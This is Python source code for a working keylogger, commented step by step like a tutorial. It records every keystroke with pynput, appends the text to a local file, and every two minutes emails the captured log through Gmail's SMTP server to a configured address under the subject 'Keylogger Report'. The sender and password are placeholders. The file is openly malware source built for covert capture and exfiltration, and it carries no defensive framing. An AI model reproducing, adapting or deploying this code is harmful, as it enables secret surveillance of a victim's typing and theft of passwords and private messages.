# =================== IMPORTS ===================

# Listens to keyboard events
from pynput.keyboard import Listener

# For tracking time durations (used for timed emailing)
import time

# For running email sender in a separate thread
import threading

# For sending emails using SMTP
import smtplib

# For creating properly formatted email messages
from email.mime.text import MIMEText


# =================== VARIABLES ===================

# Initialize the log with a session start marker
log = "\n=== Session Started ===\n"

# Record the start time to measure elapsed time later
start_time = time.time()


# =================== EMAIL FUNCTION ===================

def send_email(message):
    """
    Sends an email with the provided message content.
    Uses Gmail's SMTP server and an app password.
    """
    sender = "xyz"
    password = "xyz"  # App password generated from Google
    receiver = "xyz"

    # Create an email message object
    msg = MIMEText(message)
    msg['Subject'] = "Keylogger Report"
    msg['From'] = sender
    msg['To'] = receiver

    # Setup the SMTP connection and send email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()                        # Secure the connection
    server.login(sender, password)          # Login using app password
    server.send_message(msg)                # Send the email message
    server.quit()                           # Close the SMTP connection


# =================== KEYBOARD LISTENER ===================

def on_press(key):
    """
    Called every time a key is pressed.
    Captures the key and updates the log.
    """
    global log
    try:
        # If the key is a character (e.g. letter or number), log it directly
        if key.char:
            log += key.char
    except:
        # Handle special keys
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        elif key == key.backspace:
            log = log[:-1]  # Remove the last character
        else:
            # Log any other special key
            log += f' [{key}] '

    # Save current log to file (append mode)
    with open("keylog.txt", "a") as f:
        f.write(log)


# =================== LOG CHECKER & EMAIL SENDER ===================

def check_and_send_log():
    """
    Runs in a background thread.
    Checks every few minutes and sends an email if enough time has passed.
    """
    global log, start_time
    while True:
        # Check if 2 minutes (120 seconds) have passed
        if time.time() - start_time >= 120:
            if log:
                # Send email with current log content
                send_email(log + "\n=== Session Ended ===\n")
                # Start a new log session after sending
                log = "\n=== Session Started ===\n"
            # Reset timer
            start_time = time.time()


# =================== THREAD AND MAIN LOOP ===================

# Start background thread to automatically send logs every 2 minutes
threading.Thread(target=check_and_send_log, daemon=True).start()

# Start the keyboard listener — keeps running until stopped manually
with Listener(on_press=on_press) as listener:
    listener.join()
